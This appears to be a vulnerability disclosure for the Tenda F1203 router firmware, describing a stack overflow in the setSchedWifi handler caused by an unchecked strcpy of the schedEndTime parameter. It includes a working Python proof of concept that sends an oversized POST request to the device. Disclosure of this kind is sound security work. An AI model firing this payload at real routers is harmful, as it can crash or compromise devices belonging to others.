## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2494.html

## Affected version

F1203 V2.0.1.6

## Vulnerability details

The Tenda F1203 V2.0.1.6 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `v6` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `ptr` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedEndTime`, the statement `strcpy((char *)ptr + 10, v6);` can cause a buffer overflow. The user-provided `schedEndTime` can exceed the capacity of the `ptr` array, triggering this security vulnerability.

![image-20240305225509194](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225509194.png)

![image-20240305225530022](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225530022.png)

![image-20240319134434006](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134434006.png)

![image-20240319134449058](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134449058.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedEndTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319134504557](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134504557.png)
